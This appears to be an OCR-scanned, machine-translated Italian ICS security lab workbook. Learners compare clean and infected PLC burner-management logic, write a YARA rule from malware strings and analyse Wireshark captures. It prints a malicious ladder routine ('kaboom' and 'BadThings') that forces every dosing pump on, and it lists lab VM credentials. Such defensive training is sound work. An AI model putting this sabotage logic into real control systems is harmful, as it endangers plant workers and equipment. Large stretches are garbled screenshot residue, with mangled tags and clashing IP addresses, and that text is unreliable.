 e Identificare cosa c'era di sbagliato nella logica e ripristinare il sistema in uno stato buono e Determinare quando la manipolazione della logica ha provocato per la prima volta una manipolazione nell'HMI

*Informazioni sullo scenario* L'HMI C3PO è stato bloccato inaspettatamente dopo la modifica della logica dell'OEM al Click PLC. A prima vista questo non ha senso perché ciò implicherebbe che una modifica del PLC abbia un impatto negativo sull'HMI, ma è lo scenario più realistico visti i recenti cambiamenti. Pertanto, dobbiamo analizzare la logica e i dati di rete disponibili per determinare l'analisi della causa principale.
 Preparazione agli esercizi
 Questo esercizio utilizzerà la VM Windows e i file BurnerManagement.L5k e BurnerManagementinfected.L5K nella cartella File dello studente sul desktop.

[Domande |
 1. Cosa ci dicono i tag sullo scopo del file logico?
 2. Qual è la routine dannosa?
 3. Cosa sta accadendo nella logica?

© 2021, Robert M. Lee Lab5.1-1 Compito — Determinare dove nel codice PLC viene comandato l'HMI 5:
 1.
 Cosa ci dicono i tag sullo scopo del file logico?
 Il file logico gestisce le pompe dosatrici e le pompe per il sistema di gestione del bruciatore

> Utilizzando Notepad++ rivedere BurnerManagement.L5K.

> Apri Blocco note++
> Apri BurnerManagement.L5k
> Esaminare il file per acquisire familiarità con esso

[Il nuovo 1 - Blocco note++
 File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ? I8HS 8 FAl4 eH Ac noi «|B J
=jnuovo 1 E3|

—————
 Durata del file di testo normale: 0 righe: 1
 FMI
 tn:1 Col:1 Pos: 1
 Windows (CRLF) UTF-8 INS
 File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
 Nuovo Apri... Apri la cartella contenente Apri nel visualizzatore predefinito Apri cartella come area di lavoro... Ricarica da disco Salva con nome... Salva una copia con nome. ave A Rinomina... Chiudi Chiudi tutto Chiudi Altro Sposta nel cestino
 Carica sessione... Salva sessione.
 Ctri+R

“5
 Ctrl+Alt+S
 Ctri+Ww Ctri+Shift+W

© 2021, Robert M. Lee
 Laboratorio 5.1-2

@,

@
 Ce@e@) oe

@
 Pe, Pe, oe, aw, ee ae,
 eh

?,

(*> noi © GW © Ww Ww ww &Y Ww WwW WH WO WD WwW WO WD W
 a5
 File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
| (X Apri x
+ > Questo PC > Desktop > File degli studenti > calistogarefinery v & Pp Organizza + Nuova cartella ira | (2)
; -ve Nome. Data di modifica Dimensione tipo
 Accesso rapido _ BurnerManagement.L5K _— 01/08/2021 15:41 Logix Designer Im...

: {Download di Desktop Pa +

_ BurnerManagementinfected.L5K 01/08/2021 15:41 Logix Designer Im...
 ey Ca\Users\sansics\Desktop\ Student Files\calistogarefinery\BurnerManagement.L5K - Blocco note++
 File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ? SSH. ea|*¢hh| Sel me(aalB
 i aE IRR
 fe] BumerManagement.L5K £9
 a ©®|2 ORB eB

(AR RE RARER RRR RRR R RE ER EKER RKB ERE ERERR RARER ERE
 Versione di importazione-esportazione i= R5Logix 5000 v16.04
 Imo ww
 Proprietario Dragos Inc. Esportato := Thu Jul 16 11:08:36 2020 FOCUS IOC IIA II IOI RIOR IY 2 IE_VER := 2.7; CONTROLLER Burner_Management_Safety System (Descrizione := "Burner Management Safety System", ProcessorType := "1756-L55", Major := 16, TimeSlice := 20, ShareUnusedTimeSlice := 1, CommPath := "AB ETHIP-3\10.10.20.10 \Backplane\o", RedundancyEnabled := 0, KeepTestEditsOnSwitchOver := 0, DataTablePadPercentage := 50, SecurityCode := 6, SFCExecutionControl := "“CurrentActive", SFCRestartPosition "MostRecent", SFCLastScan := "DontScan", SerialNumber := 16 #0019 cli4, MatchProjectToController := No, InhibitAutomaticFirmwareUpdate := 0) MODULO Locale (Genitore := "Locale",
 ParentModPortid := 1,
 Numerocatalogo := "1756-L55",
 Venditore := 1,

*Nota* Ogni file di progetto è diverso e non tutti gli OEM supportano l'esportazione del file come file di testo leggibile. Rockwell tende a farlo e quindi possiamo visualizzare il file di progetto in Notepad ++

*Nota* Sarebbe molto utile incontrare un ingegnere per illustrare cosa sta realmente accadendo sul
 ma fortunatamente ci sono alcuni ottimi commenti e descrizioni su questo file logico del sistema di sicurezza per la gestione del bruciatore che possiamo esaminare.

© 2021, Robert M. Lee Lab 5.1-3
*Nota* Come esempio vediamo che i valori DP1 — DP25 sono relativi alla pompa dosatrice. I valori che vediamo sono identici a quelli che abbiamo visto prima nel corso nel traffico di rete; si tratta di tag associati ai valori che fanno parte del ciclo di controllo.
 AG DP1 OF Locali:2:0.Data.1 (Descrizione := "Pompa Dosatrice 1", RADIX := Decimale); DP1LO OF Locale:2:0.Dati.10 (Descrizione := "Pompa dosatrice 10", RADIX := Decimale); Livello DPiG : DINT (RADIX := Decimale) := G; DPl0Running : BOOL (Descrizione := "Stato di funzionamento pompa dosatrice 10", RADIX := Decimale) := 0; DPidStart : BOOL (Descrizione := "Avvio dose temporizzata per DP10", RADIX := Decimale) := 0; DPi0Time OF DP1lOTimer.PRE (RADIX := Decimale); DPi0dTimeDelay OF DP10TimerDelay.PRE (RADIX:= Decimale); DPi0Timer : TIMER (Descrizione := "Timer per pompa dosatrice 10") := [0,0,0]; DPi0TimerDelay : TIMER (Descrizione:= "Ritardo timer per pompa dosatrice i0") := [9,0,0]; DPil OF Local:2:0.Data.11 (Descrizione := "Pompa dosatrice 11", RADIX := Decimale); Livello DPii : DINT (RADIX := Decimale) := 5; DPiiRunning : BOOL (Descrizione := “Stato di funzionamento pompa dosatrice 11", RADIX := Decimale) := G;

*Nota* Se non hai familiarità con le pompe dosatrici potresti parlare con un operatore dell'ambiente oppure qui potresti cercare su Google le informazioni. Per brevità, una pompa dosatrice è una pompa per la portata precisa di un prodotto chimico o di una sostanza in altri flussi di fluidi come acqua o gas. Possono essere utilizzati, ad esempio, per pompare sostanze chimiche da un serbatoio nel processo per una reazione chimica. In questo ambiente sono importanti per il bruciatore e causare modifiche alle pompe dosatrici porterebbe probabilmente a un valore catastrofico se modificato troppo drasticamente nel processo fisico.
 Pl OF Local:2:0.Data.16 (Descrizione := "Pompa i", RADIX := Decimale);
 P10 OF Locai:2:0.Data.25 (Descrizione := "Pompa 10", RADIX := Decimale);
 Livello PlOL : DINT (RADIX := Decimale} := 50;
 PlGRunning : BOOL (Descrizione := "Stato di esecuzione pompa 10", RADIX := Decimale} := 9;
 PlOStart : BOOL (Descrizione := "Avvio dose temporizzata per P10", RADIX := Decimale) := @;
 Pl0Time OF P10Timer.PRE (RADIX := Decimale);
 PlOTimeDelay OF Pl0TimerDelay.PRE (RADIX := Decimale);

*Risposta* Vediamo anche che i valori P sono in uso nella logica e sono correlati allo stato delle pompe. La funzione principale di questo file logico sia per i valori DP che per i valori P riguarda le pompe correlate al processo di gestione del bruciatore.

© 2021, Robert M. Lee Lab 5.1-4
 a we@, @@@@ ® fl*

>>»? Omrnmnmnennmm7®®
 ww
 E)
 noi WD
 ap
 2. Qual è la routine dannosa?
 Routine delle cose brutte

> Utilizzando il menu Plugin, seleziona il menu a tendina Confronta e fai clic su Confronta i due file

> Aprire il file BurnerManagementinfected.L5K
> Fai clic su Plugin > Confronta > Confronta
> Identificare i cambiamenti

[Lf CAUsers\sansics\Desktop\Student Files\calistogarefinery\BurnerManagementinfected.L5k - Blocco note++
 ile Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui plugin Finestra 7 s2HG 28a ¢4¢ 8 OH Oc¢ mee e|BR Confronta > Strumenti MIME x
[APARNA PR ERODATHOEE ARPA EAN REEREONERROEEERERERE Convertitore > 2 NppExport > Import-Export 4 Versione RSLogix 5000 v16é.04 Plugin Amministrazione...
 Dragos Inc. Apri la cartella dei plugin...
 Imposta come primo per confrontare Confronta Cancella confronto attivo
 Cancella tutti i confronti
 Diff dall'ultimo salvataggio SVN Diff Git Diff
 Ignora gli spazi
 Ctri+Alt+1 Ctri+Alt+C Ctri+ Alt+X Ctri+ Alt+ Maiusc+X
 Ctri-Alt+D Ctrl+Alt+V Ctri+ Alt+G

*Nota* Verrà visualizzato un confronto affiancato di entrambi i file CSV. Scorrendo le differenze,
 vedrai le aree evidenziate in cui si sono verificati i cambiamenti.
 Flmetanagenere 15K 3
 eae TimerDrinkStart: leas RADIX jese END_TAG
 BOOL (Descrizione:= "Avvia il timer delle bevande a
:= Decimale) := 07
 PROGRAMMA MainProgram (MAIN := "MainRo} MODE := 0,
 Bandiera Disabie := 9)
 TAG TAS

:= Decimale)
 END_TAG END_TAG
 Cose brutte di ROUTINE Cose brutte di ROUTINE
 4 SSE ESG SE
 END_ROUTINE END_ROUTINE
 erDrinkStart +
 kaboom:
 1°) BumerManagementinected L5K E3
 BOOL (Descrizione := “Avvia il timer delle bevande ~ RADIX := Decimale) :
 BOOL (Descrizione:
 Decimale) 2 DINT (Descrizione RADIX := Decimale)

+ OTE (kaboom) ;
= XIC (kaboom) OTE (DP1Start) :
¢ XIC (kaboom) OTE (DP2St
: XIC (kaboom) OTE (DP3Star! i: XIC (ic
¢ XIC (Jab
+ XIC (kaboom) OTE (DPéStar'
: XIC (kaboom) OTE (DF7Star'
+ XIC (kaboom) OTE (DFSStar 1 XIC (kaboom) OTE (DP9Star'
: XIC (kaboom) OTE (DI
: XIC (kaboom) OTE (DF1
: XIC (kaboom) OTE (DF125
+ XIC (kaboom) OTE (DP13Sta:

) OTE (DP4St. m) OTE (DPSStar!
 taggami",
 ce Etichetta 2",

*Nota* L'ovvia aggiunta è il tag "kaboom" e le informazioni associate alla routine "BadThings".

(avviso spoiler: non è così ben chiamato negli incidenti della vita reale).

*Risposta* Routine delle cose brutte

© 2021, Robert M. Lee
 Laboratorio 5.1-5 3.Cosa sta accadendo nella logica?
 Un circuito forzato sulle pompe dosatrici
 kaboom : BOOL (Descrizione := “niente da vedere qui", RADIX := Decimale) := 0; Test_Tag : DINT (Descrizione := "Test Tag 1", RADIX := Decimale) := 0; Test_Tag 2 DINT (Descrizione := "Test Tag 2", RADIX := Decimale) '*= 0; ; END_TAG
 ROUTINE Cose brutte

: OTE (kaboom) ;

: XIC(kaboom) OTE (DP1Start) ;
: XIC(kaboom) OTE (DP2Start) ; XIC (kaboom) OTE (DP3Start); XIC (kaboom) OTE (DP4Start); XIC (kaboom) OTE (DP5Start);
: XIC (kaboom) OTE (DPéStart) ;
: XIC(kaboom) OTE (DP75tart) >;
: XIC(kaboom) OTE (DPSStart);
: XIC(kaboom) OTE (DP9Start) ;
: XIC(kaboom) OTE (DP10Start) ;
: XIC(kaboom) OTE (DP1iStart) ;
: XIC(kaboom) OTE (DP12Start);
: XIC (kaboom) OTE (DP13Start) ;
 22zaaz2azaazaaaazaaaaae

*Risposta* In molti casi di logica ladder l'istruzione XIC (Esamina se chiuso) è un'istruzione fondamentale utilizzata nella programmazione dei PLC. L'istruzione XIC controlla se il bit specifico è in uno stato logico ALTO. Se questo è vero, il resto della logica continuerà a funzionare. L'istruzione OTE è nota come istruzione Output Energize. L'istruzione OTE energizzerà un singolo bit di dati se l'input che porta ad essa è vero. Pertanto, insieme, questa logica garantisce che il tag “kaboom” sia sempre impostato su alto. Valuta e forza diversi valori DP a rimanere sempre attivi, forzando il sistema di gestione del bruciatore a funzionare sempre a pieno regime. Ciò porterebbe probabilmente a un incidente di sicurezza a seconda di una serie di variabili fisiche, di processo e di controllo della struttura. Si tratta ovviamente della causa principale di ciò che è accaduto nella nostra raffineria, date tutte le informazioni di cui disponiamo ora.

© 2021, Robert M. Lee
 Laboratorio 5.1-6

=

“) (@) (@) (2) (Per (=) [“) =) “=
 M@") @) ")
 wn®
 TD®® Lab 5.2 — Regole YARA

' |Obiettivi e Identificare indicatori rapidi nei campioni di malware
e Sviluppare una regola YARA per gli indicatori

*Informazioni sullo scenario* Abbiamo concluso l'indagine, ma vogliamo creare alcune semplici regole YARA per definire rapidamente l'ambito dei sistemi nella nostra organizzazione e garantire di avere l'intero ambito dell'indagine per il lavoro di pulizia che inizierà presto.

<s

<<»
 Questo esercizio utilizzerà il tuo RELI.C.S. VM e il malware nella cartella ics515 > calistogarefinery > malware > F) malware2
 1. Quali sono alcuni buoni indicatori dalle stringhe di malware dei seguenti file?
 Esempi di malware:
 beacon.exe

= flexsvr.exe

“dl RSLINX.exe FTActivationBoost.exe
 vwVai @&
 UN

© 2021, Robert M. Lee Lab 5.2-1
 sì
 au 2.
 Utilizzando YARA quali di queste stringhe si trovano nei file di memoria engwrkstn_memdump.mem e viewdesigner_memdump.mem?

© 2021, Robert M. Lee
 Lab 5.2-2 wD ww Ww Ww Ww
 wp
 qs
 Compito: creare indicatori dalle stringhe del malware
 1. Quali sono alcuni buoni indicatori dalle stringhe di malware dei seguenti file? Esempi di malware: beacon.exe flexsvr.exe RSLINX.exe FTActivationBoost.exe
 beacon.exe
 emulatore cip hmi_

__cip_ple_time pitone

_cip ple informazioni _

> Inizia il tuo RELI.C.S. VM

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Passare alla cartella malware?2 per Calistoga Refinery
> Apri un terminale
> Eseguire il seguente comando nel terminale: cd /home/relics/Desktop/ics515/calistogarefinery/malware/malware2

> Esegui le stringhe rispetto ai quattro campioni di malware designati e identifica le stringhe che potrebbero costituire buoni indicatori

> Nel Terminale su ogni file esegui il comando Strings. Esempio: stringhe beacon.exe

*Nota* Se per te è più semplice, genera il contenuto in un file di testo aggiungendo "> name.txt" al comando o esegui il comando "strings beacon.exe | less" e utilizzare la barra spaziatrice per avanzare nell'output

© 2021, Robert M. Lee Lab 5.2-3 a
 6 Beacon.exe: 6
_dllonexit etmainargs ¢
_initenv
_lconv_init set_app_type _
_setusermatherr Ly acmdin . cexit - fmode e inittern iob lock '
 sbloccare winmajor.
 KERNEL32.d1L svcrt.dll

*Nota* Niente di veramente risalta su beacon.exe, potresti trasformarne alcuni in indicatori ma per questo file useremo semplicemente il nome del file stesso come indicatore, ad esempio beacon.exe
 FTActivationBoost.exe:

-xmllettore)
 oeaeeeje#s oo om
 diavolo
 eo a
 bunicodedata.pyd nome file manifest cip_hmi_emulator.exe.manifest srary.zip

-pyz
#python37.dtl

© 2021, Robert M. Lee Lab 5.2-4
 su a
 Sono
 Ww WwW Ww WW
 w
 a WwW Uy wy Ww Ww
 qs

*Nota* Ci sono alcune ottime opzioni in questo file. Potresti scegliere una serie di cose come "python" poiché sarebbe estremamente anomalo su una stazione operatore, ma sceglieremo "cip_hmi_emulator" come indicatore.
 RSLINX.exe:
 plc_information.exe.manifest rypto-1_1.d1l
 nome file manifest cip_plc_information.exe se_library zip pyz thon37.dt1

*Nota* Ancora una volta molte ottime scelte qui e c'è un tema sull'utilizzo di Python in queste famiglie di malware. Ci concentreremo però su “cip_plc_information”.
 Flexsvr.exe: Bpyiboot01_ bootstrap
 Llect.pyd icodata.pyd
 spython37.dl

*Nota* L'indicatore "cip_plc_time" sarà buono da questo file (tutto questo è soggettivo e potresti scegliere un'ampia varietà di elementi).

*Rispondi* cip_plc_time, cip_plc_information, cip_hmi_emulator, beacon.exe e includeremo python perché è apparso così tante volte.

© 2021, Robert M. Lee Lab 5.2-5 Compito ~ Sviluppare una regola YARA per gli indicatori
 2. Utilizzando YARA quali di queste stringhe si trovano nei file di memoria engwrkstn_memdump.mem e viewdesigner_memdump.mem?
 beacon.exe
 pitone

> Crea una regola YARA utilizzando gli indicatori
> Apri l'editor di testo nella barra degli strumenti nella parte inferiore del RELI.C.S. VM
> Crea una regola YARA per soddisfare quanto segue sfruttando gli indicatori che abbiamo appena trovato o Utilizzerai i parametri "wide" e "nocase" per cercare le lettere separate su più byte, cosa comune da vedere nei file di memoria e assicurando che la distinzione tra maiuscole e minuscole non sia non importa
 1 regola calistogarefinery
 2{
 3 corde:
 ce) Sal = “cip_plc_time" nocase wide
 5 Sa2 = "beacon.exe" nessun caso di larghezza
 6 $a3 = "python" nocase largo
 7 $a4 = "cip_hmi_emulator" nocase wide 8 $a5 = “cip_plc_information" nocase wide 9 10 condizione: 11 1 di loro 12 }

> Salvare il file nella cartella di memoria
> Salvare il file nella cartella ics515>calistogarefinery>memoria
 René Calistogarefinery
 reliquie (]Desktop ics515_—calistogarefinery memory +

> Esegui la regola YARA sulle immagini di memoria di ViewDesigner e EngWorkstation
> Esegui il seguente comando yara -s calistogarefinery engwrkstn_memdump.mem > eng.txt

© 2021, Robert M. Lee Lab 5.2-6

(@)
 ehi

@)
 oP ® & @ @® @ @ @ @ © ® © OO ® © ® OD
 w
 Vw8 i
 noi8

> Esegui il seguente comando yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt
> Controlla i file di output aprendoli
 yara -s calistogarefinery engwrkstn_memdump.mem > ing. TXT

$ yara -s calistogarefinery viewdesigner_memdump.mem > hmi.txt
 z raffineria pacittege engwrkstn_memdump.mem
 2 Ox62bba2c:$a2: b\xO00e\x00a\x00c\x000\x0On\ x00. \x0e\x00x\x00e\x00 3 Ox707b88e:$a2: b\x00e\x00a\x00c\xO00\x0On\ x00. \xOBe\x0Ox\x00e\x00 4 Ox707cfT6:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xO0e\x00x\xd0e\x00 5 0x70c388e:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \x00e\x0Ox\x00e\x00 6 0x70c4e96:$a2: b\x00e\x00a\x00c\x000\x0On\x00. \xO0e\x0Ox\xO0e\xO0 7 0x70c6156:$a2: b\x00e\x00a\x00c\x000\x00n\x00. \x0Ge\x00x\x00e\x00 8 0x710e88e:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xO0e \x00x\x00e\x00 9 ®x712b88e:$a2: b\xO0e\xd0a\x00c\xO00\ xOOn\ xOO. \xOGe\xOOx\x00eE\x00 10 0x7840f74:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \xOBe\x00x\x09e\x00 11 0x808619a:$a2: b\x00e\x00a\x00c\x000\x00n\ x00. \x00e\x00x\x00e\x00 12 0x8389482:$a2: B\xQOE\x00A\x00C\x000\xOON\x00. \xOOE\x00X\xO0E\x00

*Nota* Ricerca widecase su più byte in memoria per i valori. Qui vediamo nello screenshot
"beacon.exe" è scritto. b\x00 e\x00 a\x00 c\x00 o\x00 n\x00 e così via. Vediamo i seguenti valori nel file di testo: beacon.exe e python.

*Risposta* Anche se ci sono molti più risultati nel file HMI, la risposta è sempre la stessa, beacon.exe e python. Potremmo trovare altri indicatori di valore, ma questi due sembrano essere quelli più coerenti e probabili che vorremmo utilizzare per definire l'ambito dei nostri sistemi all'interno dell'organizzazione per una rapida ricerca di indicatori per assicurarci di comprendere l'intero ambito dell'indagine.

© 2021, Robert M. Lee Lab 5.2-7 ww w ww ww w Ww w ww Ww WwW LW Ww ww 1w ww ww = er _-_
 Ww

_ Giorno 5 - Mini Capstone — Calistoga Rai
 e Acquisire maggiore familiarità con gli strumenti principali evidenziati nel corso e Acquisire familiarità con ulteriori tipi di minacce

*Informazioni sullo scenario* Sei un consulente che è stato assunto per valutare la rete di una piccola I.C.S. facilità. Il personale del sito ha raccolto alcuni pacchetti catturati da esaminare. Utilizzando i concetti del ciclo di difesa informatica attiva, familiarizzerai con la rete e poi cercherai un. Una volta identificata una minaccia, proverai a scoprire informazioni su di essa e sul sistema interessato. Il personale in loco ha messo a tua disposizione una linea di base apparentemente pulita, AnalysisSession3, con cui iniziare. Se la risposta all'incidente rivela qualcosa, dovrai eseguire alcune analisi di base sulle capacità della minaccia. Sebbene non sia disponibile Threat Intelligence su eventuali minacce potenziali, è importante considerare che, se viene scoperta una minaccia, come e cosa condivideresti con i tuoi colleghi nella comunità.
 Preparazione agli esercizi
 Puoi utilizzare qualsiasi strumento, macchina virtuale o risorsa a tua disposizione per completare lo scenario mini-capstone del Giorno 5. Wireshark e Redline verranno utilizzati nella procedura dettagliata come un approccio che è possibile adottare. I dati per l'esercizio sono nel file RELI.C.S. e Windows VM nella cartella Calistoga Rail.

*Nota* Le seguenti domande riguardano Capture 4:
 Di chi è l'iPhone in rete?
 Ciò che I.C.S.protocollo(i) è presente sulla rete? Qual è l'indirizzo IP dei due HMI? Quanti client Modbus TCP esistono?
 P@NP

*Nota* Le seguenti domande riguardano Capture 5:
 Qual era il referrer per il firmware Phoenix Contact Download? Quale file zip è associato al firmware?
 Quale eseguibile c'è nel traffico?
 Da quale indirizzo IP ha avuto origine l'eseguibile?
 SN AH

*Nota* Le seguenti domande riguardano Capture 6:
© 2021, Robert M. Lee I.C.S.515 Mini-Capstone del quinto giorno 1 9.
 Qual è il file zip nel traffico?

*Nota* Le seguenti domande riguardano Capture 7:
 10. 11. 12. 13. 14.
 Quale strano traffico di rete si sta verificando?
 Quali dispositivi di controllo vengono presi di mira?
 Ci sono file strani che potrebbero essere correlati a questo traffico?
 Quale utente è associato allo strano traffico? Quale indirizzo IP è associato al file dispari?

*Nota* Le seguenti domande riguardano AnalysisSession3:
 15.16.17.18.19.
 Quali sono i due indirizzi IPv4 per il computer ripreso?
 Da quale posizione/cartella è stato eseguito "0001.bat"?
 Quale programma dannoso (file zip) è stato scaricato e utilizzato? Dove potrebbe trovarsi il file nascosto? Questa attività è correlata all'attività di rete?

*Nota* Le seguenti domande riguardano AnalysisSession4:
 20.21.22.23.

*Nota* Le seguenti domande richiederanno una ricerca open source/ricerca su Internet:
 24. 25. 26. 27. 28.
 Quale file potenzialmente dannoso è stato eseguito da “In Gary”? "In Gary" era un amministratore?
 Quando è stato creato lo script dalle acquisizioni di rete sul sistema? Qual è l'hash MD5 dello script?
 In quale repository di codice è possibile trovare lo script dannoso?
 Lo script può semplicemente leggere i registri o anche scrivervi?
 L'uso dello script (per la sua configurazione) sembrava mirato?
 È stato probabilmente il lavoro di una minaccia esterna o interna?
 Che tipo di informazioni potrebbero essere condivise per aiutare la comunità?

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno
 2 ® BAB BA BD *2)

(@)

@)
 eh. ae oe oe,
 o
 ohm
 oO Ww WwW WW WW WW VY Vy wr wwe
 Ww
 wow Ww

©
 Domande: con procedura dettagliata

*Nota* Le seguenti domande riguardano Capture 4:
 La cattura 4 è una cattura di base dell'I.C.S. interno. rete.
 1.
 Di chi è l'iPhone in rete? Tom
 Un modo per cercare i dispositivi BYOD è cercare le stringhe comuni ad essi associate. In Wireshark, puoi scegliere Trova pacchetto in Modifica e cercare la stringa "telefono".
 File Modifica Visualizza Vai Cattura Analizza Statistiche Tel
 copia

© Trova pacchetto... <err
 Trova successivo Trova precedente
 4 Wireshark Trova pacchetto — Hes —

| Autore: ©) Installatore del display © Valore esadecimale @ Sting —
 Ecce | telefono -_

=| _ Direzione: 7

; Cerca nel ; Opzioni stringa

| @ Elenco pacchetti Con distinzione tra maiuscole e minuscole | ©Su

| © Dettagli del pacchetto | | Larghezza carattere: |® Giù
| © Byte del pacchetto | [Stretto ampio
 r SSIES OT : r z es ] bint [trova] [cence |
 Nel pacchetto evidenziato possiamo vedere che l'iPhone di Tom era connesso.
 a Toms-iPhone-4, locale: digitare ANY, classe IN, domanda "QM" Nome: Toms-iPhone-4. Locale
[Lunghezza nome: 19]

[Conteggio etichette: 2]

& (Una reazione eet
 va bene. ecorc oho carvar feache hac disponibile
 Tyna:
 6d e2 80 99 73 20 69 50 68 6f be 65 Oc 5f 64 65
 Ross
 Senza cercare "telefono", uno dei metodi più affidabili è visualizzare gli indirizzi MAC in Wireshark > Endpoint e cercare fornitori comuni come Apple.

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 3 2. Ciò che I.C.S. protocollo(i) è presente sulla rete? ModBus TCP e OPC
 Per cercare i protocolli per i quali Wireshark probabilmente dispone di dissettori, è utile cercare in Gerarchia dei protocolli.
 File Modifica Visualizza Vai Cattura Statistiche anali Strumenti di telefonia Intern
©O4m ate 1B Riepilogo Commenti Riepilogo
 Filtro:
 Mostra risoluzione indirizzo 0, Time ee dl Protocol Hierarchy
 Siamo un ee ee
 AZ 611 NE7EIA 1 FE 33 © Ho}
 In questo caso vediamo Modbus TCP e Ambiente di calcolo distribuito/Chiamata di procedura remota
(DCE/RPC). Wireshark non dispone di un dissettore OPC, quindi qui visualizza OPC come DCE/RPC perché OPC è un protocollo basato su DCOM. Non sappiamo con certezza se DCE/RPC sia effettivamente OPC in questo momento ma, in un sistema I.C.S. ambiente, questa è una buona cosa da cercare; inoltre, data questa intuizione, possiamo cercare la stringa "OPC" e scoprire che sulla rete è presente un server MatrikonOPC.
 3. Quali sono gli indirizzi IP dei due HMl? 25.10.22.100 e 25.10.22.103
 Utilizzando Statistiche > Conversazioni in Wireshark, possiamo vedere che sia 10.25.22.100 che 10.25.22.103 stanno parlando con dispositivi di controllo (quelli che utilizzano Modbus TCP). Non possiamo semplicemente escludere l'indirizzo IP che utilizza OPC perché anche il server SCADA stesso potrebbe avere un server OPC. In questo caso possiamo filtrare fino ai due indirizzi IP. Ma solo questi due indirizzi IP non ci diranno molto; vogliamo utilizzare altre comunicazioni che potrebbero essere presenti sulla rete, come il servizio di nomi netBIOS di Windows. Pertanto, un metodo consiste nel filtrare i due indirizzi IP e il servizio dei nomi netBIOS, che in Wireshark è rappresentato come nbns.
 4 Cattura 4.pcapng_ [Wireshar File Modifica Visualizza Vai Acquisisci Analizza Statistiche Strumenti di telefonia Interni Guida

©O4BAZ\/SBSExX2 Qe ev aTFsi (SB Qaaal wsesx B
 Filtro: {ip.addr==10.25.22.100 || ip.addr==10.25.22.103) && nbns —" Espressione... Cancella Applica Salva
 N. Ora Origine Destinazione Protocollo Lunghezza Informazioni 11925 118. 71196110. 25.22.100 20°25. 22-255 NBNS 92 Interrogazione nome NB TOM-WORK<20> 11928 118. 712802 10. 25. 22.200 10. 25.22.100 NBNS 122 Risposta interrogazione nome NB 10.25.22.200 30113 288.153375 10.25.22 .100 16.25522.255 NBNS inet VTSCADA<1c > 30207 288. 90319510. 25. 22.100 10.25.22.255 NBNS me interroga NB VTSCADA<ic>
 Da qui vediamo che 10.25.22.100 si identifica come server VISCADA. Osservando il traffico, vediamo che anche 10.25.22.103 fa lo stesso. Anche 10.25.22.100 si identifica successivamente come SCADA2. Questa rete dispone quindi di due server HMI. Troverai attivo anche 10.25.22.101, ma esegue solo richieste di lettura e non è contrassegnato nella stessa convenzione di denominazione nelle query sui nomi degli HMI. Sebbene sia più difficile da determinare, potremmo determinare che si tratta probabilmente di uno storico e non di un HMI. Se includi tutte e tre le risposte va bene, ma in realtà solo .100 e .103 sono gli HMI.
 4. Quanti client Modbus TCP esistono? quattro

© 2021, Robert M. Lee I.C.S.515 Mini-Capstone 4 del quinto giorno

(®) (@>

(®)
 io&&©©

® w Ww Ww ww ww Tw Tw Tw wy Tw yw Ww
 sì, sì

“uF
 Ay
 ww a wy ay
 w
 Possiamo creare un filtro per Modbus TCP (digitare mbtcp nella casella Filtro e fare clic su Applica). Quindi fare clic su Endpoint ma nella parte inferiore della casella fare clic su "Limita per visualizzare il filtro" in modo che vengano conteggiati solo i dispositivi visualizzati dal nostro filtro. Ci sono quindi quattro client su cui esegue il polling i server SCADA. Sono 10.25.22.3, 10.25.22.5, 10.25.22.6 e 10.25.22.8.

*Nota* Le seguenti domande riguardano Capture 5:
 Capture 5 si trova nella DMZ da cui è possibile accedere a Internet. È stato catturato per te dal personale del sito.
 5. Qual era il riferimento per il firmware Phoenix Contact Download? _http://firmwaregratuito/download
 Quando si apre questa acquisizione di pacchetti, è subito evidente che non è in corso solo la comunicazione del sistema di controllo: in questo caso è presente traffico Web HTTP. Per vedere cosa sta succedendo, possiamo selezionare il primo traffico HTTP che vediamo (o filtrare fino a HTTP) che è il pacchetto numero 16. Facendo clic con il pulsante destro del mouse e selezionando Segui flusso TCP, possiamo vedere cosa sta succedendo.
 583 GET /downloads/Phoenixcq SIEM 60 [Aggiornamento finestra TCP] 80-4 Mark Packet (attiva/disattiva) 60 8049250 [ACK] Seq=1 Ack _ |gnore Packet (attiva/disattiva)
 71 [Segmento TcP di un reass¢ © Imposta riferimento temporale (toggle) p35 HTTP/1.0 200 OK (testo/H © TimeShift...
 60 49250-80 [ACK] Seq=530 4
 60 49250-80 [FIN, ACK] Pacchetto modifica sequenza
 i Commento pacchetto...
 60 80-49250 [ACK] Seq=900 4 82 Porta sorgente: 49152 Dest
 Risolvi manualmente l'indirizzo
 Applica come filtro

| Preparare un filtro sull'interfaccia 0 | Filtro di conversazione
:84:b1 (00:30:44:06:84:ba) | Colora Conve: n A, 2.2 :(20.24..2) pettorali (ite! Ba | ocean
 un un un

+
 SCTP Segui il flusso TCP
 A Segui flusso TCP (tcp.stream eq 0)
 Contenuto in streaming =
 OTTIENI /downloads/Phoenixcontact-Download_2014~12-30_14-44-27/ HTTP/1.1 . _ Accetta: ede Me ee a bo jmage/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */* Referer: http 7/#rect irmat e/down 103d / -ijemmnesamememesnem

| Accetta lingua: en-US
 Agente utente: Mozilla/4.0 (compatibile; MSIE 7.0; windows NT 6.1; win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3,0.30729; Media Center PC6.0)
 CPU UA: AMD64
 Codifica accettata: gzip, deflate
 Host: firmware gratuito
 connessione: Keep-Alive
 Il referrer per questa sessione era http://freefirmware/downloads che è immediatamente un brutto segno da vedere. Gli aggiornamenti del firmware dovrebbero provenire solo da fonti di fornitori approvati.
 6. Quale file zip è associato al firmware? AX SW SUITE 1.81 AddOn vi.zip _

